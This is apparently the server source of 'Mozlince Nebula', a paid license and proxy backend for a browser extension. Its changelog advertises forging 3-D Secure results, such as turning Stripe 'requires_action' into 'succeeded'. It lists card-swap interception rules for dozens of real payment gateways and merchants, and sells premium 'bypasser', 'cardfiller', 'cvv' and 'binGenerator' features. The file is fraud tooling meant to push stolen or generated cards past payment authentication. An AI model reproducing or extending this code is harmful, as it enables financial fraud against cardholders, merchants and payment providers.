/* ═══════════════════════════════════════════════════════════════
   ✦ MOZLINCE NEBULA  ·  v8.6.0 QUANTUM++
   © Asheo Systems · Premium License Engine & 3DS Proxy
   ───────────────────────────────────────────────────────────────
   ◈ Compatível com a extensão Asheo v1.6.2 (API_BASE = mozlince.onrender.com)
   ◈ Correções v8.6.0:
     - 3DS2 bypass ativo em /payments/details (forge challengeResult)
     - EXCLUSIVE_TARGETS com /payments/details, Stripe 3DS2, Basis Theory
     - swap-only reinterpretado (não bloqueia forge de 3DS)
     - Headers x-asheo-3ds2-* alinhados com extensão v1.6.2
     - gwPass aceito como auth no proxy
     - Stripe 3DS2 forge (requires_action → succeeded)
     - Timeout 15s upstream com AbortController
     - HMAC validation opcional (não bloqueia 3DS)
   ═══════════════════════════════════════════════════════════════ */
require('dotenv').config();
const express = require('express');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');
const fs = require('fs');
const zlib = require('zlib');

const app = express();
app.set('trust proxy', 1);

const ALLOWED_HEADERS = [
  'Origin','X-Requested-With','Content-Type','Accept','Authorization','Asheo-Pass',
  'X-Install-Id','X-Client-Tag','X-License-Key','X-Request-Id','Accept-Language','Accept-Encoding',
  'x-asheo-target','x-asheo-method','x-asheo-install','x-asheo-ts','x-asheo-sig','x-asheo-build',
  'x-asheo-nonce','x-asheo-origin','x-asheo-auth','x-asheo-gw-pass','x-asheo-bin','x-asheo-card','x-asheo-clientkey',
  'x-asheo-special-hosts','x-asheo-headers','x-asheo-swap-only','x-asheo-3ds-strip',
  'x-asheo-remove-cvv','x-asheo-bt-host','x-asheo-pack-fmt','x-asheo-attest','x-asheo-session',
  'x-asheo-replay','x-asheo-3ds2-subtype','x-asheo-3ds2-type','x-asheo-3ds2-trans-status',
  'X-Telegram-Bot-Api-Secret-Token'
].join(', ');

app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', ALLOWED_HEADERS);
  res.setHeader('Access-Control-Expose-Headers', [
    'Content-Length','Content-Encoding','X-Request-Id',
    'x-asheo-proxied','x-asheo-swapped','x-asheo-swap-ok','x-asheo-pack-fmt',
    'x-asheo-upstream-status','x-asheo-elapsed-ms',
    'x-asheo-adyen-verdict','x-asheo-adyen-result','x-asheo-adyen-reason','x-asheo-adyen-psp',
    'x-asheo-3ds2-verdict','x-asheo-3ds2-attempts','x-asheo-3ds2-trail',
    'x-asheo-3ds2-token','x-asheo-3ds2-payment-data','x-asheo-3ds2-subtype',
    'x-asheo-3ds2-type','x-asheo-3ds2-trans-status',
    'x-asheo-bt-host','x-asheo-replay','x-asheo-session'
  ].join(', '));
  res.setHeader('Access-Control-Max-Age', '86400');
  res.setHeader('X-Powered-By', 'Mozlince-Nebula/8.6.0');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

app.use((req, res, next) => {
  if (req.path.startsWith('/v1/gw') || req.path.startsWith('/v1/process')) return next();
  express.json({ limit: '4mb', verify: (req,res,buf) => { req.rawBody = buf; } })(req, res, (err) => {
    if (err) return next(err);
    express.urlencoded({ extended: false, limit: '4mb', verify: (req,res,buf) => { req.rawBody = buf; } })(req, res, (err2) => {
      if (err2) return next(err2);
      express.text({ type: ['text/*','application/xml'], limit: '4mb', verify: (req,res,buf) => { req.rawBody = buf; } })(req, res, next);
    });
  });
});

app.use('/v1/gw', express.raw({ type: '*/*', limit: '4mb' }));
app.use('/v1/process', express.raw({ type: '*/*', limit: '4mb' }));

/* ═══ DESIGN SYSTEM (logs) ═══ */
const C = { r:'\x1b[0m', b:'\x1b[1m', d:'\x1b[2m', gray:'\x1b[38;5;245m', dim:'\x1b[38;5;240m', violet:'\x1b[38;5;99m', violetB:'\x1b[38;5;135m', cyan:'\x1b[38;5;45m', cyanB:'\x1b[38;5;51m', gold:'\x1b[38;5;220m', goldB:'\x1b[38;5;226m', mint:'\x1b[38;5;121m', green:'\x1b[38;5;46m', rose:'\x1b[38;5;204m', red:'\x1b[38;5;196m', amber:'\x1b[38;5;214m', blue:'\x1b[38;5;39m' };
const TAGS = { INFO:C.cyanB, OK:C.green, WARN:C.amber, ERRO:C.red, SYS:C.violetB, ATIV:C.blue, BOT:C.cyanB, FEAT:C.rose, BOOT:C.mint, API:C.gold, DBG:C.dim, TG:C.cyanB, SUPPORT:C.gold, I18N:C.blue, RULES:C.rose, DM:C.rose, GW:C.cyanB, HMAC:C.amber, PROXY:C.violetB, GZIP:C.mint, DS2:C.rose };
function log(t, m) { const ts = new Date().toISOString().replace('T',' ').substring(0,19); const tag = (TAGS[t]||C.gray) + C.b + '▸ ' + t.padEnd(7) + C.r; console.log(`${C.dim}${ts}${C.r} ${tag} ${m}`); }
function redactCard(obj) { try { const c = typeof obj === 'string' ? JSON.parse(obj) : obj; if (!c || typeof c !== 'object') return obj; const out = { ...c }; if (out.number) out.number = String(out.number).replace(/\d(?=\d{4})/g,'*'); if (out.cvv) out.cvv = '***'; if (out.cvc) out.cvc = '***'; if (out.holder) out.holder = String(out.holder).substring(0,2) + '***'; if (out.holderName) out.holderName = String(out.holderName).substring(0,2) + '***'; return out; } catch { return obj; } }
function banner() {
  console.log(`\n${C.violet}   ╭──────────────────────────────────────────────╮${C.r}`);
  console.log(`${C.violet}   │${C.r}  ${C.cyanB}${C.b}◈  MOZLINCE${C.r}  ${C.goldB}${C.b}NEBULA${C.r}  ${C.dim}·${C.r}  ${C.gold}v8.6.0${C.r} ${C.dim}QUANTUM++${C.r} ${C.violet}│${C.r}`);
  console.log(`${C.violet}   │${C.r}  ${C.dim}Premium License Engine · Asheo Systems${C.r}     ${C.violet}│${C.r}`);
  console.log(`${C.violet}   ╰──────────────────────────────────────────────╯${C.r}\n`);
}

/* ═══ CHAVES ES256 ═══ */
let PRIVATE_KEY = null, PUBLIC_KEY = null, ORIGEM = 'nenhuma';
(function initKeys() {
  const fp = ['/etc/secrets/private.pem','./private.pem','/etc/secrets/ec_private.pem'];
  const fu = ['/etc/secrets/public.pem','./public.pem','/etc/secrets/ec_public.pem'];
  for (const f of fp) { try { if (fs.existsSync(f)) { PRIVATE_KEY = fs.readFileSync(f,'utf8').trim(); ORIGEM='file:'+f; break; } } catch {} }
  for (const f of fu) { try { if (fs.existsSync(f)) { PUBLIC_KEY = fs.readFileSync(f,'utf8').trim(); break; } } catch {} }
  if (!PRIVATE_KEY) { let p = process.env.EC_PRIVATE_KEY || process.env.JWT_PRIVATE_KEY_PEM || ''; if (p) { if (!p.includes('BEGIN')) { try { p = Buffer.from(p.trim(),'base64').toString('utf8'); } catch {} } PRIVATE_KEY = p.replace(/\\n/g,'\n').trim(); ORIGEM = 'env'; } }
  if (!PUBLIC_KEY) { let pu = process.env.EC_PUBLIC_KEY || process.env.JWT_PUBLIC_KEY_PEM || ''; if (pu) { if (!pu.includes('BEGIN')) { try { pu = Buffer.from(pu.trim(),'base64').toString('utf8'); } catch {} } PUBLIC_KEY = pu.replace(/\\n/g,'\n').trim(); } }
  if (PRIVATE_KEY) {
    try {
      const k = crypto.createPrivateKey(PRIVATE_KEY);
      const pubFromPriv = crypto.createPublicKey(k).export({ type:'spki', format:'pem' });
      const jwk = crypto.createPublicKey(k).export({ format:'jwk' });
      if (!PUBLIC_KEY) PUBLIC_KEY = pubFromPriv;
      log('OK', `Chave privada carregada (${ORIGEM}) · kid=${(jwk.x||'').slice(0,8)}…`);
    } catch (e) { log('ERRO','Chave privada inválida: '+e.message); PRIVATE_KEY = null; }
  } else { log('ERRO','Nenhuma chave privada encontrada — /v1/activate vai falhar 500'); }
  if (!PUBLIC_KEY) { log('WARN','PUBLIC_KEY ausente — verify usará PRIVATE_KEY'); PUBLIC_KEY = PRIVATE_KEY; }
})();

/* ═══ ENV ═══ */
const UPSTASH_URL = process.env.UPSTASH_REDIS_REST_URL;
const UPSTASH_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const OWNER_ID = process.env.OWNER_ID;
const TELEGRAM_WEBHOOK_SECRET = process.env.TELEGRAM_WEBHOOK_SECRET || '';
const SERVER_URL = (process.env.SERVER_URL || 'https://mozlince.onrender.com').replace(/\/+$/,'');
const RULES_VERSION = 35;

/* ═══ CONSTANTES DE PLANO ═══ */
const FEATURE_KEYS = ['browserMods','ruleOpsLab','liveHud','advancedProtection','apiAccess','experimentalFeatures'];
const CAPABILITY_KEYS = ['adyenGateway','customEncryptedGateways','binGenerator'];
const LIMIT_KEYS = ['binPool','ccQueue','ruleLimit','profileLimit','randomRouting'];
const PREMIUM_SCOPE = ['bypasser','cardfiller','cvv','premium','browserMods','persona','rules','gateways','exclusive'];
const PREMIUM_LIMITS = { max_accounts:-1, daily_actions:-1, max_templates:-1, history_days:-1, export_limit:-1, binPool:null, ccQueue:null, ruleLimit:null, profileLimit:null, randomRouting:true };
const FREE_LIMITS = { max_accounts:1, daily_actions:20, max_templates:3, history_days:3, export_limit:5, binPool:2, ccQueue:10, ruleLimit:20, profileLimit:2, randomRouting:false };

const PACOTES = {
  '3d':   { nome:'3 Dias',    dias:3,     preco:3,   emoji:'◔', lifetime:false },
  '7d':   { nome:'7 Dias',    dias:7,     preco:5,   emoji:'◕', lifetime:false },
  '15d':  { nome:'15 Dias',   dias:15,    preco:7,   emoji:'◑', lifetime:false },
  '30d':  { nome:'30 Dias',   dias:30,    preco:12,  emoji:'◒', lifetime:false },
  '45d':  { nome:'45 Dias',   dias:45,    preco:17,  emoji:'◓', lifetime:false },
  '90d':  { nome:'3 Meses',   dias:90,    preco:30,  emoji:'✦', lifetime:false },
  '180d': { nome:'6 Meses',   dias:180,   preco:45,  emoji:'✧', lifetime:false },
  '1a':   { nome:'1 Ano',     dias:365,   preco:70,  emoji:'⟡', lifetime:false },
  'life': { nome:'LIFETIME',  dias:36500, preco:190, emoji:'∞', lifetime:true  }
};
const precoFmt = usd => `$${Number(usd || 0).toFixed(2)}`;

const PAYMENT_RULES = [
  { defaultId:"stripe.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Stripe", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:api\\.stripe\\.com|js\\.stripe\\.com)(?:\\/|$)",flags:"i"}, matchContentType:"application/x-www-form-urlencoded", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"worldpay.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Worldpay", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:hpp|payments|secure)\\.worldpay\\.com(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"endurance.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Endurance", patternEnc:{kind:"regex",source:"^https:\\/\\/securepay\\.svcs\\.endurance\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"safecharge.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Safecharge", patternEnc:{kind:"regex",source:"^https:\\/\\/secure\\.safecharge\\.com(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"paddle.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Paddle", patternEnc:{kind:"regex",source:"^https:\\/\\/checkout-service\\.paddle\\.com\\/[^?#]*\\/pay(?:[?#]|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"adyen.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Adyen", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:checkoutshopper-live(?:-[a-z0-9]+)?\\.adyen\\.com|checkoutshopper-live(?:-[a-z0-9]+)?\\.cdn\\.adyen\\.com)\\/(?:checkoutshopper\\/)?v\\d+\\/(?:sessions\\/[^/]+\\/)?payments(?:\\/details)?(?:[/?#]|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"boosteroid.adyen", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Boosteroid Adyen", patternEnc:{kind:"regex",source:"^https:\\/\\/cloud\\.boosteroid\\.com\\/api\\/v2\\/payments\\/adyen\\/subscription\\/create(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"chess.adyen", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Chess.com Adyen", patternEnc:{kind:"regex",source:"^https:\\/\\/www\\.chess\\.com\\/payment\\/adyen\\/pay(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"gog.adyen", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"GOG Adyen", patternEnc:{kind:"regex",source:"^https:\\/\\/api\\.gog\\.com\\/v\\d+\\/checkout\\/[a-z0-9]+\\/payment(?:[/?#]|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"lootbar.adyen", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Lootbar", patternEnc:{kind:"regex",source:"^https:\\/\\/api\\.lootbar\\.com\\/api\\/v2\\/asset\\/pay\\/adyen\\/card\\/request(?:[\\/?#]|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"xsolla.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Xsolla", patternEnc:{kind:"regex",source:"^https:\\/\\/secure\\.xsolla\\.com\\/paystation2\\/api\\/.*$",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"recurly.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Recurly", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:[a-z0-9.-]+\\.)?recurly\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/x-www-form-urlencoded", requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"tebex.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Tebex", patternEnc:{kind:"regex",source:"^https:\\/\\/checkout\\.tebex\\.io(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"nordpayments.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"NordPayments", patternEnc:{kind:"regex",source:"^https:\\/\\/iframe-api\\.nordpayments\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:["primary_account_number","expiration_year","expiration_month","cvv"], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"grammerly.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Grammarly", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:gr4vy\\.app|gateway\\.grammarly\\.com|payments\\.grammarly\\.com)(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:["payment_method.number","payment_method.expiration_date","payment_method.security_code"], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"rizzup.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"RizzUp", patternEnc:{kind:"regex",source:"^https:\\/\\/rizzup\\.net(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"fortis.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Fortis", patternEnc:{kind:"regex",source:"^https:\\/\\/api\\.fortis\\.tech(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"jsbasistheory.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Basis Theory", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:api|js)\\.basistheory\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"braintree.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Braintree", patternEnc:{kind:"regex",source:"^https:\\/\\/payments\\.braintree-api\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"mercadopago.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"Mercado Pago", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:api|sdk)\\.mercadopago\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"xendit.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Xendit", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:api\\.xendit\\.co\\/v2\\/credit_card_tokens|pali-orchestrator-prod-live\\.xendit\\.co)(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"razorpay.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"Razorpay", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:api|checkout|cdn)\\.razorpay\\.com(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"paystack.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"Paystack", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:standard|api|checkout|js)\\.paystack\\.(?:co|com)(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"payu.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"PayU India", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:test|secure|info|uat-partner)\\.payu\\.in(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"epicgames.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"Epic Games", patternEnc:{kind:"regex",source:"^https:\\/\\/payment-website-pci\\.ol\\.epicgames\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"appsnetpk.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"IPG (apps.net.pk)", patternEnc:{kind:"regex",source:"^https:\\/\\/ipg\\d*\\.apps\\.net\\.pk(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"primer.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Primer", patternEnc:{kind:"regex",source:"^https:\\/\\/sdk\\.api\\.primer\\.io(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"bluesnap.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"BlueSnap", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:www1\\.)?bluesnap\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:["ccNumber"], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"bridgerpay.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"BridgerPay", patternEnc:{kind:"regex",source:"^https:\\/\\/checkout\\.bridgerpay\\.com\\/api\\/(?:v2\\/deposit\\/credit-card|n\\/payment-details-cache)(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"spreedly.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Spreedly", patternEnc:{kind:"regex",source:"^https:\\/\\/core\\.spreedly\\.com\\/v1\\/payment_methods(\\/restricted\\.json)?",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"openpay.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Openpay", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:sandbox-)?api\\.openpay\\.(?:mx|co|pe|com)(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"nmi.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"NMI", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:secure\\.)?nmi\\.com\\/api\\/transact\\.php",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"nmi.collectjs", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"NMI CollectJS", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:secure\\.)?nmi\\.com\\/token\\/api\\/save_multipart_token(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"tailoredpay.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"TailoredPay", patternEnc:{kind:"regex",source:"^https:\\/\\/tailoredpay\\.transactiongateway\\.com\\/token\\/api\\/save_multipart_token(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"sagepay.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Opayo (Sage Pay)", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:live|test|pi-live|pi-test)\\.sagepay\\.com(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"viva.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Viva", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:demo-)?api\\.vivapayments\\.com\\/nativecheckout\\/v2\\/chargetokens",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"codapayments.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Codapayments", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:api-tc|tc-api-card-sandbox)\\.codapayments\\.com\\/v1\\/(?:pub\\/)?direct\\/charges",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"checkout.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Checkout.com", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:api\\.(?:sandbox\\.)?|card-acquisition-gateway\\.)checkout\\.com\\/tokens",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"airwallex.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Airwallex", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:[a-z0-9-]+\\.)*airwallex\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"tokenex.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"TokenEx", patternEnc:{kind:"regex",source:"^https:\\/\\/htp\\.tokenex\\.com\\/iframe\\/v3",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"cashfree.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"Cashfree", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:sandbox\\.|api\\.|sdk\\.|payments\\.)?cashfree\\.com\\/(?:checkout\\/api\\/checkouts\\/payments\\/?)?",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"zuora.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"Zuora", patternEnc:{kind:"regex",source:"^https:\\/\\/rest\\.(?:[a-z0-9-]+\\.)*zuora\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"vgs.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"VGS", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:vgsapi\\.com|[a-z0-9-]+\\.(?:sandbox|live)\\.verygoodproxy\\.com)\\/cards(?:[/?#]|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"patreon.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Patreon", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:www\\.)?patreon\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"authorizenet.default", defaultVersion:1, isDefault:true, enabled:true, name:"Authorize.Net", patternEnc:{kind:"regex",source:"^https:\\/\\/api2\\.authorize\\.net\\/xml\\/v1\\/request\\.api",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"], swapCapable:false }
];

const EXCLUSIVE_TARGETS = [
  {hostSuffix:"checkoutshopper-live.adyen.com", id:"adyen", method:"POST", pathPattern:"/payments"},
  {hostSuffix:"checkoutshopper-live.adyen.com", id:"adyen", method:"POST", pathPattern:"/payments/details"},
  {hostSuffix:"checkoutshopper-live.adyen.com", id:"adyen", method:"POST", pathPattern:"/sessions"},
  {hostSuffix:"checkoutshopper-live.adyen.com", id:"adyen", method:"POST", pathPattern:"/paymentMethods"},
  {hostSuffix:"checkoutshopper-live-us.adyen.com", id:"adyen", method:"POST", pathPattern:"/payments"},
  {hostSuffix:"checkoutshopper-live-us.adyen.com", id:"adyen", method:"POST", pathPattern:"/payments/details"},
  {hostSuffix:"checkoutshopper-live-eu.adyen.com", id:"adyen", method:"POST", pathPattern:"/payments"},
  {hostSuffix:"checkoutshopper-live-eu.adyen.com", id:"adyen", method:"POST", pathPattern:"/payments/details"},
  {hostSuffix:"checkoutshopper-test.adyen.com", id:"adyen", method:"POST", pathPattern:"/payments"},
  {hostSuffix:"checkoutshopper-test.adyen.com", id:"adyen", method:"POST", pathPattern:"/payments/details"},
  {hostSuffix:"checkoutshopper-live.cdn.adyen.com", id:"adyen", method:"POST", pathPattern:"/payments"},
  {hostSuffix:"checkoutshopper-live.cdn.adyen.com", id:"adyen", method:"POST", pathPattern:"/payments/details"},
  {hostSuffix:"pal-test.adyen.com", id:"adyen", method:"POST", pathPattern:"/pal/servlet/"},
  {hostSuffix:"pal-live.adyen.com", id:"adyen", method:"POST", pathPattern:"/pal/servlet/"},
  {hostSuffix:"checkoutshopper-live.adyen.com", id:"adyen", method:"POST", pathPattern:"/3ds2/"},
  {hostSuffix:"checkoutshopper-live.adyen.com", id:"adyen", method:"POST", pathPattern:"/threeDS2/"},
  {hostSuffix:"cloud.boosteroid.com", id:"boosteroid.adyen", method:"POST", pathPattern:"/api/v2/payments/adyen/subscription/create"},
